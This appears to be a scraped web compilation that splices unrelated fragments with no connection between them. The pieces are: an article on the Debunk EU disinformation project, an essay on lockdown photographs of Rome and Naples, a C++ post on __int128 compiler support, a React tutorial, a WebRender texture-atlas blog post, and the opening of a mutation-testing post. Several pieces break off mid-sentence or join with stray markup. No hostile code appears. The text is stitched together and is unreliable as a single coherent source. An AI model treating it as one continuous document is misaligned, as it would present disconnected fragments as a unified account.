<p>Now, as a second wave of Covid-19 engulfs Europe, Debunk EU hopes that its elves and algorithm will be more prepared to handle the flood. Last summer, as the country’s case count dropped, the organization made a series of changes to better deal with the crisis. The pandemic was no longer new, making it easier for Debunk EU’s software to recognize conspiracy theories that had appeared previously. The organization also continued expanding into other countries, including Poland; it currently operates in 26 languages. It also launched the Lithuanian version of an online game called <a href="https://www.delfi.lt/en/lifestyle/recognize-disinformation-after-this-game-you-will-be-expert-in-recognising-fake-news.d?id=85216601">Bad News</a> that trains people to spot disinformation. It’s been used by more than 100,000 people, according to the group.</p>



<p>“Our model is fully scalable,” said Daukšas, although the organization’s future still depends on the generosity of outside backers. The disinformation-tracking space is crowded with dozens of similar projects, all vying for the same grants from tech companies and nonprofits. (Debunk EU plans to add a public donate function on its website soon.)&nbsp;</p>



<p>Funding challenges are a symptom of the larger problem facing Debunk EU. Because disinformation comes in so many forms — foreign and domestic, traditional media and social media, email spoofing and Twitter bots — it’s nearly impossible for any one organization to keep up. It’s also unclear whether debunking always makes a difference. A recent <a href="https://www.ualberta.ca/law/media-library/faculty-research/hli/media/images/caulfield-debunking-works-vulnerable-caulfield.pdf">literature review</a> conducted by a University of Alberta researcher found that evidence supporting debunking’s ability to change minds is uneven at best, though the study noted that efforts like Debunk EU should certainly still continue.&nbsp;</p>



<p>No single organization can hope to address the central challenge with …</p></div></div>

<div><p>Those who have travelled off the beaten track through the Italian south in recent summers will know the empty piazzas at lunchtime, where dogs doze in the semi-shade of the cathedrals, two to three tourists roam the streets in search of art or food, and where, above all, everything is closed. Shutters, doors, restaurants, shops, churches. Instead, silence, flickering heat, the sun high in the sky, sharp contrasts. A bar in the city centre may be open, usually next to the main church or town hall, possibly also a small museum. At around 5 pm the torpor dissolves, urban life returns to the street, shutters open, shop blinds are pushed up, widows sparsely occupy the church benches. <br>Those who stayed in towns and cities in Italy in the spring of 2020 experienced this well-known lunchtime scene all day, everywhere. And now we came to know this emptiness differently, heard the silence in another way; the shops and bars were still closed, but it wasn’t the same. Even big city dwellers had experienced it: the quiet, the emptiness, the contrast to “before”. The Spanish Steps in Rome deserted, no more long queues in front of the Colosseum, the Trevi Fountain in monumental silence. These images went around the world and met with similar content from other metropolises such as Paris, New York, or Madrid. The fascinating thing was feeling one was participating in this situation, contributing to it through absence, our virtual connection with a place and the thought that you could stand there in a very short time – as, for example, the direct proximity of the Bibliotheca Hertziana in the Palazzo Zuccari to the Spanish Steps would allow. The curfews involved us in the latest goings on in the city, without us actually and physically being allowed to be part of them. </p><p>For this exhibition, we have selected photographs taken in Rome and Naples in the spring of 2020 during the hard lockdown caused by the COVID-19 pandemic. For over three months, people in Italy were only allowed to leave their homes in a few exceptional cases with good reasons. Only essential activities could still be carried out outside one’s own four walls. The profession of photographer was one of them.<br>Enrico Fontolan, Marcello Leotta, and Luciano Pedicini and his sons Marco and Matteo photographed renowned and lesser-known monuments, residential streets and individual buildings, large panoramas and small details. Whatever seemed remarkable was recorded, and in these weeks this also meant the long-familiar, the thousand-times recalled, things that had been photographed and documented millions of times. It is not that the Trevi Fountain had suddenly become another monument, the Colosseum another ancient amphitheatre, but the process of photographic documentation was different. Not the object in front of the camera, but the person behind it had changed, and with them also the viewer of the photographs. With the semantic addition of “lockdown”, they have not only received a time stamp, but also a new quality – quite an emotional one – which distinguishes them from previous documentary photographs. Roland Barthes’ essay <i>Rhétorique de l’image</i> (Communications 4, 1964) analyses the mutual condition of concept and image by distinguishing between the non-coded (denoted) pictorial message, the coded (connoted) contextual pictorial message, and finally the linguistic message, which specifies the framework of the image’s possible interpretations via the accompanying text. Here, the term “lockdown” connotes and fixes the photographed view, as in the developer bath. “The viewer is in the picture” – rarely have individual photographs, let alone series of images, been bestowed with such an individual and collective level of meaning, one that goes far beyond what is physically visible.</p></div>

<div><p>The joy in the opportunities to take photos was not total, with the ideal conditions for documentary photography set against the context of unsettling news. One of the premises of art-historical documentary photography is to photograph buildings and monuments as far as possible without people, animals, vehicles, advertising, or street signs. All the photographers involved, as well as the staff of the Photographic Collection, have shifted pews, moved barriers, diverted passers-by or stopped trucks to allow for the most unobstructed shot possible. Although what was perceived as disturbing was frequently the thing that stood out in the photograph in many different ways, the pure monument without any visual distraction was always considered to be of higher value for research purposes. Millions of art-historical and archaeological photographs in photo libraries and publications have borne witness to this focussed purism since the early days of photography. If, for example, a photograph of the Arch of Constantine from the late 19th century is placed next to one from the spring of 2020, we see they both essentially have in common a concentration on the monument itself. Without knowing the circumstances in which each picture came about, however, one will not get beyond purely objective description. Only by analysing the information on a semantic level can we gain deeper insights and interpretation beyond comparing images, and thus embed the photos in their historical and social contexts.</p><p><span>We have therefore asked the photographers to contextualise their shots by describing their motivation and impressions of these photo campaigns in personal statements. Luciano, Marco, and Matteo Pedicini, who express their initial scepticism when photographing empty squares and streets (“beh, è quello che facciamo da sempre” – “well, but that’s how we’ve always done it”), reflect on the “quiete durante la tempesta”, the calm during the storm, and the experience that certain aspects of their hometown of Naples – rampant greenery taking possession of the buildings and visual disfigurement through advertising, street signs, building cladding – are now more prominent than ever. Marcello Leotta calls his impression of the city of Rome under lockdown “Roma nuda” – naked Rome. The rift between the uneasiness and the fascination of this extraordinary situation makes him reflect and at the same time encourages him to learn and to document analytically and by era. Enrico Fontolan ventured into this other Rome rather hesitantly and incredulously at first. He looked and marvelled at monuments like the Pantheon, which he never believed he would ever be able to photograph “deserto”, and draws a historical comparison with famous photographers who deliberately sought the same emptiness and silence that the pandemic had now inadvertently forced in the mild spring of 2020.&nbsp;</span><span>With the distance of a few months after their creation, these photographs have gained semantic depth. The pandemic has become a global and long-lasting state of emergency. What seemed unique at first can now be relativised and quantified in chronological order; facts and associations, reality and fascination are in constant exchange. The medium of photography is there to depict the world, it is up to the viewer to describe and interpret the result.</span></p><p><strong>***</strong></p></div>

<p>March 2020: The COVID-19 virus locks people in and opens up cities to unknown visions. In the days after the lockdown came into force, urban landscapes around the world changed profoundly and took on a form no one could ever have suspected or imagined. The peculiar social and anthropological state caused by the virus left the world’s metropolises without visible life. Everything seemed to be frozen as if in a frame. For those who observe and record the nuances of reality, for photographers, there was a unique opportunity to capture the unimaginable.<br>The day after the first government decree, which put the population under curfew, with exemptions for a few entitled persons, including photographers, I decided to start a reportage on Rome. My idea was to show the city in pictures highlighting the urban environment and historical monuments, while emphasizing the novelty of the context that had so dramatically emerged; to bear rigorous, almost austere witness to what the millennial stratification of Rome has left behind, taking advantage of the absence of social life. Photo reportage itself becomes a moment in the history of the city, a synthesis of an event that has never taken place before in such radical form.<br>Walking for hours through streets that are notoriously chaotic, but then suddenly almost completely free of noise and human presence, brought about conflicted feelings in me. On the one hand, the unease of a place without the physiologically pulsating life that enlivens it, but on the other, the extraordinary uniqueness, the history, and the urban context of the Eternal City, without being distracted by the myriad obstacles that normally stand between the viewer and reality. Every street, every palace, every monument, every church, and every single detail stood there to testify to its own presence, they were there to proclaim their liberation from constraints, finally freed from the material and conceptual restraints imposed on them by man, especially in the last century.<br>Naked Rome. Rome, imbued by its centuries-old charm, finally immersed in silence. <br>Between March and the end of April 2020, I took some two thousand photographs, of which I then selected 280, all of which were acquired by the Bibliotheca Hertziana’s Photographic Collection. The images, in RAW format, were taken with a 36 MP Nikon 810 camera and then developed and edited with Adobe Photoshop.</p>

    <p>How well is <code>__int128</code> supported, and what are its
properties? A Godbolt-based survey of the Big Four compilers.
Spoiler alert: libc++ thinks it’s integral, libstdc++ thinks it’s integral
only in <code>-std=gnu++XX</code> mode(!), and MSVC thinks it doesn’t exist at all.</p>

<p>Many thanks to Rein Halbersma for alerting me to libstdc++’s different behavior
in <code>-std=gnu++XX</code> mode versus <code>-std=c++XX</code> mode.</p>

<h2 id="compiler-support">Compiler support</h2>



<p>GCC, Clang, and Intel ICC all support a built-in <code>__int128</code> type.
Microsoft MSVC does not support any 128-bit integral type as far as I’m aware.</p>

<p>On GCC, Clang, and ICC, <code>__int128</code> is a token similar to <code>int</code>: you can modify
it with <code>unsigned</code> to produce <code>unsigned __int128</code>. However, all three front-ends
also support the built-in synonyms <code>__int128_t</code> and <code>__uint128_t</code>.</p>

<div><div><pre><code>static_assert(std::is_same_v&lt;__int128_t, __int128&gt;);
static_assert(std::is_same_v&lt;__uint128_t, unsigned __int128&gt;);
    // PASSES on all three compilers
</code></pre></div></div>

<p>Both <code>__int128_t</code> and <code>__uint128_t</code> are safe to use in non-type template parameters
and constant expressions, on all compilers that support them.</p>

<h2 id="sneaky-macros">Sneaky macros</h2>

<p>The story on libstdc++ is complicated. Libstdc++ doesn’t do anything special for
<code>__int128</code>, but it does provide <em>macro hooks</em>
(<a href="https://github.com/gcc-mirror/gcc/blob/87798f3f2cf97b30e75110b5a8d2964aef62be02/libstdc%2B%2B-v3/include/std/type_traits#L285-L293">link</a>)
so that for example
<code>__GLIBCXX_TYPE_INT_N_0</code> will be treated as an integral type, whatever that macro
expands to. (If it doesn’t expand to anything, it’ll be ignored.)</p>

<p>If you compile with GCC in <code>-std=c++XX</code> mode (for any <code>XX</code>),
<code>__GLIBCXX_TYPE_INT_N_0</code> won’t be defined and so libstdc++ will consider
<code>__int128</code> a non-integral type.</p>

<p>But if you compile with GCC in <code>-std=gnu++XX</code> mode (for any <code>XX</code>), then the compiler
will pre-define these two macros:</p>

<div><div><pre><code>#define __GLIBCXX_BITSIZE_INT_N_0 128
#define __GLIBCXX_TYPE_INT_N_0 __int128
</code></pre></div></div>

<p><a href="https://bugs.llvm.org/show_bug.cgi?id=23156">As of July 2016-ish</a>, Clang also
defines these two macros in <code>-std=gnu++XX</code> mode.</p>

<p>By the way, you can use the options <code>-dM -E</code> to view all your compiler’s pre-defined macros:</p>

<div><div><pre><code>clang++ -std=c++17 -dM -E test.cc
</code></pre></div></div>

<p>The upshot is, if you compile in <code>-std=gnu++XX</code> mode, libstdc++ will treat <code>__int128</code> and
<code>unsigned __int128</code> as integral types with the proper numeric limits; but if you
compile in the usual <code>-std=c++XX</code> mode, libstdc++ will not do any of that.</p>

<p>On the other hand, libc++ treats <code>__int128</code> as an integer type, full stop.</p>

<blockquote>
  <p>I’ve worked on several projects that compiled with <code>-std=c++17 -D_GNU_SOURCE</code>. That
will give you a lot of GNU library extensions, but it will not give you <code>__int128</code> support.
libstdc++ is looking specifically for the two macros defined above, and <code>-D_GNU_SOURCE</code>
doesn’t enable those macros.</p>
</blockquote>

<h2 id="relationship-to-integer-types-and-intmax_t">Relationship to integer types and <code>intmax_t</code></h2>

<div><div><pre><code>static_assert(std::is_integral_v&lt;__int128&gt;);
    // TRUE on libc++, "it depends" on libstdc++
</code></pre></div></div>

<p>libstdc++ (in standard, non-<code>gnu++XX</code> mode) leaves <code>is_integral_v&lt;__int128&gt;</code> as <code>false</code>.
This makes a certain amount of sense from the library implementor’s point of view,
because <code>__int128</code> is not one of the <em>standard</em> integral types, and furthermore,
if you <em>call</em> it integral, then you have to face the consequence that <code>intmax_t</code>
(which is 64 bits on every ABI that matters) is kind of lying about being the
“max.”</p>

<p>In <code>-std=gnu++XX</code> mode, libstdc++ makes <code>is_integral_v&lt;__int128&gt;</code> come out to <code>true</code>,
as described in the previous section on sneaky macros.</p>

<p>Meanwhile, libc++ simply
<a href="https://github.com/llvm-mirror/libcxx/blob/aeeba70ab15e1469841c0f3f1f9c78211a541699/include/type_traits#L738-L741">sets</a>
sets <code>is_integral_v&lt;__int128&gt;</code> to <code>true</code>, unconditionally.</p>

<p>Yes, this means that on libc++ (or on libstdc++ with <code>-std=gnu++17</code>), there exist
integral values that do not fit in <code>intmax_t</code>! (<a href="https://godbolt.org/z/lMD4Iu">Godbolt.</a>)</p>

<blockquote>
  <p>In case you’re wondering: libstdc++ in standard C++17 mode considers <code>__int128</code> a “compound” type.
The definition of “compound type” is simply “anything that’s not a fundamental type,”
where “fundamental” encompasses the arithmetic types (both integral and floating-point), <code>void</code>,
and <code>nullptr_t</code>. So for example <code>int*</code> is also a compound type.</p>
</blockquote>

<h2 id="numeric-limits">Numeric limits</h2>

<p>In standard (non-<code>gnu++XX</code>) mode, libstdc++ does not specialize <code>numeric_limits</code> for <code>__int128</code> at all.
This <a href="https://godbolt.org/z/RpaD-7">has the unfortunate effect</a> of</p>

<div><div><pre><code>constexpr __int128 int128_max =
    std::numeric_limits&lt;__int128&gt;::max();
static_assert(int128_max == 0);  // TRUE on libstdc++ in standard mode
</code></pre></div></div>

<p>libc++ (and libstdc++ in <code>gnu++XX</code> mode) provides the appropriate specialization, so that
<code>numeric_limits&lt;__int128&gt;::min()</code> and <code>numeric_limits&lt;__int128&gt;::max()</code>
have the appropriate values instead of zero.</p>

<p>On libc++ <a href="https://godbolt.org/z/ZR_nn6"><code>numeric_limits</code> reports <code>__int128</code> as an integral type</a>,
whereas on libstdc++ in standard mode it doesn’t (again because there is no specialization for
<code>__int128</code> at all).</p>

<div><div><pre><code>static_assert(std::numeric_limits&lt;I128&gt;::is_integer);
    // TRUE on libc++, "it depends" on libstdc++
</code></pre></div></div>

<h2 id="signedness">Signedness</h2>

<p>libc++ reports that <code>is_signed_v&lt;__int128&gt;</code> and <code>is_unsigned_v&lt;unsigned __int128&gt;</code>.
libstdc++ in standard mode of course denies both, because only arithmetic types can be
signed or unsigned, and libstdc++ denies that <code>__int128</code> is arithmetic.</p>

<p>As for <code>make_signed</code>, libc++ (and libstdc++ in <code>gnu++XX</code> mode) reports what you’d expect —
<code>make_signed&lt;__uint128_t&gt;::type</code> is <code>__int128_t</code>, and <code>make_unsigned&lt;__int128_t&gt;::type</code> is <code>__uint128_t</code>.</p>

<p>Trying to instantiate <code>make_signed&lt;__uint128_t&gt;</code> on libstdc++ in standard mode
<a href="https://godbolt.org/z/j7BvKB">results in</a> a hard error which is not SFINAE-friendly.
(It’s undefined behavior to instantiate <code>make_signed</code> of any type which is neither
integral nor an enumeration type.)</p>

<p>Incidentally, today I learned that <code>is_signed_v&lt;float&gt; == true</code> but <a href="https://godbolt.org/z/t6v1CJ"><code>make_signed_t&lt;float&gt;</code>
is a hard error</a>.</p>

<hr>

Beep. Boop.</p></blockquote><p>The main part of the server's response usually includes three items: HTML, CSS and JavaScript.</p><p>HTML lists the content of a web page and describes its structure.

The core idea is based on a simple strategy: divide-and-conquer. If it's difficult to grok a problem all at once, we break it into smaller problems, solve them one at a time and then combine the results.</p><div><p><img alt="React breaks a problem into components" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><p>Building an app in React is almost all about working with components: breaking the app into components, finding the best components for the job, fitting one with another, creating new components from existing ones etc.</p><p>Nowadays, design tools such as Framer and Figma have components too (and symbols in Sketch). They are a lot like React components, except that the latter are more flexible and powerful. In fact, the inspiration of components in design tools came directly from components in software engineering. Once a component is created, we can create multiple instances of it. We can use it to construct other components. If we change a component, everything that includes this component will be updated automatically.</p><p>Components in React have two important properties:</p><ol><li>Components are <em>composable</em>. They are made for reuse. We can make a new component with other components.</li><li>Components are <em>independent</em> of each other. If we change the code in one place, other parts don't break.</li></ol><p>If this sounds abstract to you, don't worry! I'll show you some examples and explain these properties in details soon.</p><h3><a id="declarative-ui" href="#declarative-ui"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="20" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>Declarative UI</a></h3><h4><a id="imperative-vs-declarative" href="#imperative-vs-declarative"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="20" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>Imperative vs. declarative</a></h4><p>When directly working with the DOM API, we'd have to specify what element to change at the right time, in the right order. This is equivalent to describing to Domo how to position his head, arms and legs step by step, for each and every portrait.</p><div><p><img alt="Imperative programming" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><p>Heck, this sounds tedious and error-prone! Why can't we just tell Domo <em>what</em> we want instead of <em>how</em> to pose? In fact, this is exactly how to build a UI in React. A developer draws a quick sketch of what he or she wants. React explains it to Domo how to pose.</p><div><p><img alt="Declarative programming in React" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><p>Because the apps we build are dynamic, we often want Domo to change poses fairly quickly. We draw many sketches and hand them to React in a big pile. React stacks these sketches together and flips them like a flipbook. A dynamic UI comes live!</p><div><p><img alt="React treats input as a flipbook" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><p>In tech terms, if the code defines <em>how</em> we want it to be done, it's <strong>imperative</strong>; if it defines <em>what</em> we want, it's <strong>declarative</strong>. The traditional way of directly working with the DOM API is imperative, and the React way is declarative.</p><p>Imperative programming emerged from the day when the computers were primitive. People had to instruct them in detail: where to store the numbers, how to multiply etc. But this eventually got unmanageable, people wrote smart software that convert definition of problems into detailed instructions. Declarative programming was born.</p><h4><a id="virtual-dom" href="#virtual-dom"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="20" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>Virtual DOM</a></h4><p>Besides making the life of a developer easier, declarative programming in React also offers opportunities for performance optimization.</p><p>When React has all the sketches beforehand, he can sort through them, remove any duplication and make sure that Domo and the artist do as little work as possible.</p><div><p><img alt="React diffing with virtual DOM" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><p>These sketches are called <em>Virtual DOM</em>. Virtual DOM is much faster to manipulate than the DOM. Developers work with Virtual DOM most of the time instead of directly managing the DOM. React handles the dirty work of managing the slow DOM.</p><h3><a id="reactive-dom-updates" href="#reactive-dom-updates"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="20" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>Reactive DOM updates</a></h3><p>Even cooler, imagine if we can leave placeholders in our sketches to represent different variations of a same pose. This way, when somebody asks for portraits of Domo wearing a different hat, we don't have to talk to React again. We can just sit back and let React change it for us.</p><div><p><img alt="Thinker with a hat: Placeholder in JSX" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><p>This trick is how React got its name. The UI built with React is <strong>reactive</strong> -- it appears that the DOM "reacts" to any changes to the underlying data. No need to track the data. No need to worry about when to update the DOM. It just gets updated automatically (by React). The idea of reactive UI greatly simplifies UI development.</p><div><div><p>Now let's review what we have learned so far and get our hands dirty on a few real React components.

    <p>Lately I have been working on improving texture atlas allocation in WebRender. It isn't an outstanding technical feat, but the journey towards achieving this goal was quite pleasant. </p>
<p>This is a longer version of the piece I published in the <a href="https://mozillagfx.wordpress.com/2021/02/04/improving-texture-atlas-allocation-in-webrender/">mozilla gfx team blog</a> where I focus on the atlas allocation algorithms. In this one I'll go into more details about the process and methodology behind these improvements.</p>
<p>The first part is about the making of guillotiere, a crate that I first released in March 2019. In the second part we'll have a look at more recent work building upon what I did with guillotiere, to improve texture memory usage in WebRender/Firefox.</p>

<p>In order to submit work to the GPU efficiently, WebRender groups as many drawing primitives as it can into what we call batches. A batch is submitted to the GPU as a single drawing command and has a few constraints. for example a batch can only reference a fixed set of resources (such as GPU buffers and textures). So in order to group as many drawing primitives as possible in a single batch we need to place as many drawing parameters as possible in few resources. When rendering text, WebRender pre-renders the glyphs before compositing them on the screen  so this means packing as many pre-rendered glyphs as possible into a single texture, and the same applies for rendering images and various other things.</p>
<p>For a moment let's simplify the case of images and text and assume that it is the same problem: input images (rectangles) of various rectangular sizes that we need to pack into a larger rectangle. This is the job of the texture atlas allocator. Another common name for this is rectangle bin packing.</p>
<p><img alt="Atlas allocation" src="https://nical.github.io/images/atlas/atlas-allocation.svg"></p>
<p>Many in game and web development are used to packing many images into fewer assets. In most cases this can be achieved at build time Which means that the texture atlas allocator only needs to find a good layout for a fixed set of rectangles without supporting dynamic deallocation and allocation within the atlas at run time. I call this "static" atlas allocation as opposed to "dynamic" atlas allocation.</p>
<p>There's a lot more literature out there about static than dynamic atlas allocation. I recommend reading <a href="http://pds25.egloos.com/pds/201504/21/98/RectangleBinPack.pdf"><em>A thousand ways to pack the bin</em></a> which is a very good survey of various static packing algorithms. Dynamic atlas allocation is unfortunately more difficult to implement while keeping good run-time performance. WebRender needs to maintain texture atlases into which items are added and removed over time. In other words we don't have a way around needing dynamic atlas allocation.</p>

<p>A while back, WebRender had a naive implementation of the guillotine algorithm (explained in <a href="http://pds25.egloos.com/pds/201504/21/98/RectangleBinPack.pdf"><em>A thousand ways to pack the bin</em></a>). This algorithm strikes a good compromise between packing quality and implementation complexity.
The main idea behind it can be explained simply: "Maintain a list of free rectangles, find one that can hold your allocation, split the requested allocation size out of it, creating up to two additional rectangles that are added back to the free list.". There is subtlety in which free rectangle to choose and how to split it, but the overall, the algorithm is built upon reassuringly understandable concepts.</p>
<p><img alt="Guillotine allocation steps" src="https://nical.github.io/images/atlas/guillotine-alloc.svg"></p>
<p>Deallocation could simply consist of adding the deallocated rectangle back to the free list, but without some way to merge back neighbor free rectangles, the atlas would quickly get into a fragmented stated with a lot of small free rectangles and can't allocate larger ones anymore.</p>
<p><img alt="Fragmented state" src="https://nical.github.io/images/atlas/fragmented.svg"></p>
<p>To address that, WebRender's implementation would regularly do a O(n²) complexity search to find and merge neighbor free rectangles, which was very slow when dealing with thousands of items. Eventually we stopped using the  guillotine allocator in systems that needed support for deallocation, replacing it with a very simple slab allocator which I'll get back to later in this post.</p>
<p>I wasn't satisfied with moving to a worse allocator because of the run-time defragmentation issue, so as a side project I wrote a guillotine allocator that tracks rectangle splits in a tree in order to find and merge neighbor free rectangle in constant instead of quadratic time. I published it in the <a href="https://crates.io/crates/guillotiere">guillotiere</a> crate. I wrote about how it works in details in <a href="https://docs.rs/guillotiere/0.6.0/guillotiere/struct.AtlasAllocator.html">the documentation</a> so I won't go over it here. I'm quite happy about how it turned out, although I haven't pushed to use it in WebRender, mostly because I wanted to first see evidence that it would help and I already had evidence that many other things needed to be worked on.</p>
<h2>Visualizing program state using SVG</h2>
<p>guillotiere lets you dump a visualization of the atlas in SVG format.</p>
<p><img alt="Guillotine allocation visualization" src="https://nical.github.io/images/atlas/guillotine-example-1.svg"></p>
<p>The image above shows the state of the atlas after a few allocations. Allocated space is represented in light blue while free space is in dark gray. It is much easier to work with than a list of coordinates in plain text. It was handy when developing and tuning the algorithm, but also when using it in other projects. While looking at the visual representation of the state animate you quickly develop an intuition of how the algorithm unfolds Concepts that are hard to explain in written form sometimes just "make sense" visually.</p>
<p>Dumping visual representations in a .svg file is not only a powerful tool when exploring problem some spaces, it is also surprisingly simple to do. SVG is a straightforward XML type of format which is annoying to type by hand but effortless to generate with very simple helpers. Here is how it looks using a tiny helper crate called <a href="https://crates.io/crates/svg_fmt">svg_fmt</a>:</p>

<p>So many useful visualizations can be easily built out of simple colored rectangles and text and there's other primitives provided by svg_fmt. Rectangles were all I needed in guillotiere.</p>
<p>You can look at <a href="https://github.com/nical/rust_debug/blob/492600cac47f64bcadaf9ad037ed64c5fecc8e63/svg_fmt/src/svg.rs">how simple the svg_fmt code is</a>. It has become a dependency to most of the things I've worked on lately, including WebRender which uses it to dump visualizations of texture atlases and the render graph.</p>
<p><img alt="Render graph visualization" src="https://nical.github.io/images/atlas/rendergraph.svg"></p>
<p>My hope by now is that if you are working on problems that can be represented in 2D space, I've managed to convince you of how easily you can supplement or break free of reading text in your debugger/terminal. If anything, just <code>println!(r#"&lt;rect x="{}" y="{}" width="{}" height="{}" fill:rgb(100,0,0)" /&gt;""#, x, y, w, h);</code> your way into looking at your algorithms unfolding.</p>
<h2>Making/testing/debugging a small rust crate</h2>
<p>I had a great time writing guillotiere for several reasons. The problem itself had some nice properties:</p>
<ul>
<li>It's a well defined problem with simple input and output data. As a result it is very easy to write unit tests and fuzz the code.</li>
<li>No nebulous design space for fancy abstractions. A retained state, query a size in, get a rectangle out. Simple.</li>
<li>Can be implemented in its own library outside of a big rendering engine, and enjoy fast compile/debug iterations.</li>
</ul>
<p>It was the Rust programming language and ecosystem that really made it a such pleasant journey.</p>
<p>Bootstrapping a simple library, creating unit tests, adding dependencies is simple and effortless in Rust. This alone is a huge time saver for me compared to when I would do this sort of thing in C++ (I can only hope that the situation has improved in C++ since). Fellow Rust developers are pretty used to that so let's move on.</p>
<p>I quickly wrote a simple command-line application to interactively play with the packing algorithm.
The application deserializes the state of the atlas from a file, execute a command (for example allocation or deallocation) and serializes back into the file (using the .ron file format). In addition, the command-line application could dump a visualization of the atlas in SVG.</p>
<p>The command-line app was put together very quickly thanks to fantastic pieces of the Rust ecosystem:</p>
<ul>
<li><a href="https://crates.io/crates/serde">serde</a> for serialization/deserialzation,</li>
<li><a href="https://crates.io/crates/ron">ron</a> providing a nice and readable serialized file format,</li>
<li>and <a href="https://crates.io/crates/clap">clap</a> for parsing command-line arguments.</li>
</ul>
<p>Put together, this gave me an interactive playground to test the algorithm. Playing around in a terminal would look like:</p>
<div><pre><span></span><code>$ guillotiere init <span>1024</span> <span>1024</span>
$ guillotiere allocate <span>16</span> <span>32</span>
Allocated rectangle r1 of size 16x32 at origin <span>[</span><span>0</span>, <span>0</span><span>]</span>
$ guillotiere allocate <span>200</span> <span>100</span> --svg <span>01</span>.svg
Allocated rectangle r2 of size 200x100 at origin <span>[</span><span>16</span>, <span>0</span><span>]</span>
$ guillotiere deallocate r1 --svg <span>02</span>.svg

etc...
</code></pre></div>


<p>At any time in that sequence of commands I can open the <code>atlas.ron</code> file and read the state of the atlas as if I was in a debugger, can also copy it around to save the state in a way that almost feels as powerful as using <a href="https://rr-project.org/">record-and-replay debugging</a>.</p>
<h2>Fuzzing</h2>
<p>I mentioned fuzzing earlier. <a href="https://github.com/rust-fuzz/cargo-fuzz">Cargo fuzz</a> is a joy and I really recommend using it whenever possible. It's very easy to setup, I wouldn't necessarily run it on every push, but every once in a while to find some bugs and/or get a bit of confidence about the robustness of your code. It's great. It has plenty of well written <a href="https://rust-fuzz.github.io/book/">documentation</a> so I won't go into details here. I'll just mention that it's a very well made piece of Rust's ecosystem that contributes to the greatness of the whole in my opinion.</p>

<p>Fast forward the end of 2020. Ah 2020.</p>
<p>I was investigating further improvements to draw call batching and texture upload overhead which are big performance bottlenecks on low end Intel GPUs, especially on Windows.</p>
<p>Gathering some statistics about what causes new batches to be generated shows that it is often happening when multiple primitives use the same shader but are …</p></div></div>

<p>As someone who loves discussing Software Craftsmanship and best practices, Test Driven Development (TDD) is a bit of a sore spot for me. Let me start off by saying that I <em>love</em> TDD’s emphasis on testing. Too many software projects skimp on testing. And the results speak for themselves many years down the road, when <a rel="noreferrer noopener" href="https://software.rajivprab.com/2019/11/25/the-birth-of-legacy-software-how-change-aversion-feeds-on-itself/" target="_blank">changes take exponentially longer to implement, and people are too afraid to even touch anything</a>.</p>



<p>That said, I’ve still never been a big fan of TDD. One the one hand, it’s too strict. Insisting on writing tests first, often gets in the way of the exploratory work – work that is needed before you can iron out what the right interfaces, methods, and OO-structure should be.</p>



<p>But on the other hand, TDD is ironically <em>too lenient</em>. Many practitioners assume that because they are practicing TDD, their test-suite is rock solid. When in reality, I’ve seen far too many tests written during TDD, that still suffer from gaping coverage holes. Coverage holes that can and will result in production bugs, either now or in the future. As far as testing methodology goes, plugging these coverage holes should be your top priority – overriding all other fads and recommendations.</p>



<p>Hence why my favored testing philosophy is best illustrated by Mutation Driven Testing, which follows this sequence of steps:</p>



<ol><li>Get to a state where you have both code and successfully passing tests<ol><li>Whether you should write code-first or test-first is best debated elsewhere. You’re certainly welcome to use TDD to get to this point</li></ol></li><li>Go through your newly added/modified code, line by line, and manually inject a single bug<ol><li>When deciding what a “reasonable bug” is, assume carelessness, laziness, inexperience and incompetence. But not malice. Using tests to catch malicious bugs is exponentially harder, and less realistic</li></ol></li><li>Verify that some test now fails</li><li>If a test does not fail, review what coverage holes you have in your tests, and fix them by adding new tests or updating your existing tests<ol><li>The better you become at writing tests, the less often this should occur</li></ol></li><li>Undo the bug you just injected, and verify that your tests are now passing</li><li>Go back to step 2 and repeat, until you’ve injected every bug you can think of, or have run out of time<ol><li>As you get the hang for Mutation-Driven-Testing, you’ll develop an intuitive knack for figuring out which bugs are most likely to slip past your average test suite. This will dramatically speed up this process, and also teach you to write more comprehensive tests</li></ol></li></ol>



